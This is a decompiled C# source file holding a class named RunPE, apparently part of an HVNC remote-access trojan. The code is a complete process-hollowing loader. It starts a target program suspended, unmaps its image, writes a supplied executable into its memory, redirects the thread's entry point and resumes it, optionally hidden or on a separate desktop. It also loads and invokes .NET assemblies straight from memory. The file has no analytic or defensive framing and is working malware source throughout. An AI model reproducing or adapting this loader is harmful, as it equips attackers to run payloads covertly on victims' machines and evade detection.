using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200000D RID: 13
[StandardModule]
internal sealed class RunPE
{
	// Token: 0x06000098 RID: 152 RVA: 0x0000BCC8 File Offset: 0x00009EC8
	public static void Run3(byte[] data)
	{
		try
		{
			Thread thread = new Thread(new ParameterizedThreadStart(RunPE.Run4));
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start(data);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000099 RID: 153 RVA: 0x0000BD14 File Offset: 0x00009F14
	public static void Run4(object o)
	{
		try
		{
			MethodInfo entryPoint = Assembly.Load((byte[])o).EntryPoint;
			if (entryPoint.GetParameters().Length == 1)
			{
				entryPoint.Invoke(null, new object[]
				{
					new string[0]
				});
			}
			else
			{
				entryPoint.Invoke(null, null);
			}
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600009A RID: 154 RVA: 0x0000BD80 File Offset: 0x00009F80
	public static int TryRun(string path, string cmd, byte[] data, bool compatible, bool hidden, string Desktop = "", ref int PID = 0)
	{
		try
		{
			int num = 1;
			while (!RunPE.HandleRun(path, cmd, data, compatible, hidden, Desktop, ref PID))
			{
				num++;
				if (num > 10)
				{
					return 0;
				}
			}
			return -1;
		}
		catch (Exception ex)
		{
		}
		return 0;
	}

	// Token: 0x0600009B RID: 155
	[DllImport("kernel32.dll")]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref HVNC.SECURITY_ATTRIBUTES lpProcessAttributes, ref HVNC.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref RunPE.STARTUP_INFORMATION lpStartupInfo, out RunPE.PROCESS_INFORMATION lpProcessInformation);

	// Token: 0x0600009C RID: 156
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0600009D RID: 157
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0600009E RID: 158
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(IntPtr thread, int[] context);

	// Token: 0x0600009F RID: 159
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

	// Token: 0x060000A0 RID: 160
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

	// Token: 0x060000A1 RID: 161
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

	// Token: 0x060000A2 RID: 162
	[SuppressUnmanagedCodeSecurity]
	[DllImport("ntdll.dll")]
	private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

	// Token: 0x060000A3 RID: 163
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

	// Token: 0x060000A4 RID: 164
	[SuppressUnmanagedCodeSecurity]
	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr handle);

	// Token: 0x060000A5 RID: 165 RVA: 0x0000BDD0 File Offset: 0x00009FD0
	private static bool HandleRun(string path, string cmd, byte[] data, bool compatible, bool hidden = false, string Desktop = "", ref int PID = 0)
	{
		string text = string.Format("\"{0}\"", path);
		RunPE.STARTUP_INFORMATION startup_INFORMATION = default(RunPE.STARTUP_INFORMATION);
		RunPE.PROCESS_INFORMATION process_INFORMATION = default(RunPE.PROCESS_INFORMATION);
		startup_INFORMATION.cb = Marshal.SizeOf(typeof(RunPE.STARTUP_INFORMATION));
		if (Desktop.Length > 0)
		{
			startup_INFORMATION.lpDesktop = Desktop;
		}
		if (hidden)
		{
			startup_INFORMATION.wShowWindow = 0;
			startup_INFORMATION.dwFlags = 1;
		}
		try
		{
			if (!string.IsNullOrEmpty(cmd))
			{
				text = text + " " + cmd;
			}
			string lpCommandLine = text;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES2;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES = security_ATTRIBUTES2;
			HVNC.SECURITY_ATTRIBUTES security_ATTRIBUTES3 = security_ATTRIBUTES2;
			if (!RunPE.CreateProcess(path, lpCommandLine, ref security_ATTRIBUTES, ref security_ATTRIBUTES3, false, 4u, IntPtr.Zero, null, ref startup_INFORMATION, out process_INFORMATION))
			{
				throw new Exception();
			}
			int num = BitConverter.ToInt32(data, 60);
			int num2 = BitConverter.ToInt32(data, num + 52);
			int[] array = new int[179];
			array[0] = 65538;
			if (IntPtr.Size == 4)
			{
				if (!RunPE.GetThreadContext(process_INFORMATION.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!RunPE.Wow64GetThreadContext(process_INFORMATION.ThreadHandle, array))
			{
				throw new Exception();
			}
			int num3 = array[41];
			int num4;
			int num5;
			if (!RunPE.ReadProcessMemory(process_INFORMATION.ProcessHandle, num3 + 8, ref num4, 4, ref num5))
			{
				throw new Exception();
			}
			if (num2 == num4 && RunPE.NtUnmapViewOfSection(process_INFORMATION.ProcessHandle, num4) != 0)
			{
				throw new Exception();
			}
			int length = BitConverter.ToInt32(data, num + 80);
			int bufferSize = BitConverter.ToInt32(data, num + 84);
			int num6 = RunPE.VirtualAllocEx(process_INFORMATION.ProcessHandle, num2, length, 12288, 64);
			bool flag;
			if (!compatible && num6 == 0)
			{
				flag = true;
				num6 = RunPE.VirtualAllocEx(process_INFORMATION.ProcessHandle, 0, length, 12288, 64);
			}
			if (num6 == 0)
			{
				throw new Exception();
			}
			if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num6, data, bufferSize, ref num5))
			{
				throw new Exception();
			}
			int num7 = num + 248;
			short num8 = BitConverter.ToInt16(data, num + 6);
			int num9 = 0;
			int num10 = (int)(num8 - 1);
			for (int i = num9; i <= num10; i++)
			{
				int num11 = BitConverter.ToInt32(data, num7 + 12);
				int num12 = BitConverter.ToInt32(data, num7 + 16);
				int srcOffset = BitConverter.ToInt32(data, num7 + 20);
				if (num12 != 0)
				{
					byte[] array2 = new byte[num12 - 1 + 1];
					Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length);
					if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num6 + num11, array2, array2.Length, ref num5))
					{
						throw new Exception();
					}
				}
				num7 += 40;
			}
			byte[] bytes = BitConverter.GetBytes(num6);
			if (!RunPE.WriteProcessMemory(process_INFORMATION.ProcessHandle, num3 + 8, bytes, 4, ref num5))
			{
				throw new Exception();
			}
			int num13 = BitConverter.ToInt32(data, num + 40);
			if (flag)
			{
				num6 = num2;
			}
			array[44] = num6 + num13;
			if (IntPtr.Size == 4)
			{
				if (!RunPE.SetThreadContext(process_INFORMATION.ThreadHandle, array))
				{
					throw new Exception();
				}
			}
			else if (!RunPE.Wow64SetThreadContext(process_INFORMATION.ThreadHandle, array))
			{
				throw new Exception();
			}
			if (RunPE.ResumeThread(process_INFORMATION.ThreadHandle) == -1)
			{
				throw new Exception();
			}
			PID = (int)process_INFORMATION.ProcessId;
		}
		catch (Exception ex)
		{
			Process processById = Process.GetProcessById((int)process_INFORMATION.ProcessId);
			if (processById != null)
			{
				processById.Kill();
			}
			return false;
		}
		return true;
	}

	// Token: 0x02000020 RID: 32
	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	public struct PROCESS_INFORMATION
	{
		// Token: 0x04000078 RID: 120
		public IntPtr ProcessHandle;

		// Token: 0x04000079 RID: 121
		public IntPtr ThreadHandle;

		// Token: 0x0400007A RID: 122
		public uint ProcessId;

		// Token: 0x0400007B RID: 123
		public uint ThreadId;
	}

	// Token: 0x02000021 RID: 33
	public struct STARTUP_INFORMATION
	{
		// Token: 0x0400007C RID: 124
		public int cb;

		// Token: 0x0400007D RID: 125
		public string lpReserved;

		// Token: 0x0400007E RID: 126
		public string lpDesktop;

		// Token: 0x0400007F RID: 127
		public string lpTitle;

		// Token: 0x04000080 RID: 128
		public int dwX;

		// Token: 0x04000081 RID: 129
		public int dwY;

		// Token: 0x04000082 RID: 130
		public int dwXSize;

		// Token: 0x04000083 RID: 131
		public int dwYSize;

		// Token: 0x04000084 RID: 132
		public int dwXCountChars;

		// Token: 0x04000085 RID: 133
		public int dwYCountChars;

		// Token: 0x04000086 RID: 134
		public int dwFillAttribute;

		// Token: 0x04000087 RID: 135
		public int dwFlags;

		// Token: 0x04000088 RID: 136
		public short wShowWindow;

		// Token: 0x04000089 RID: 137
		public short cbReserved2;

		// Token: 0x0400008A RID: 138
		public int lpReserved2;

		// Token: 0x0400008B RID: 139
		public int hStdInput;

		// Token: 0x0400008C RID: 140
		public int hStdOutput;

		// Token: 0x0400008D RID: 141
		public int hStdError;
	}
}
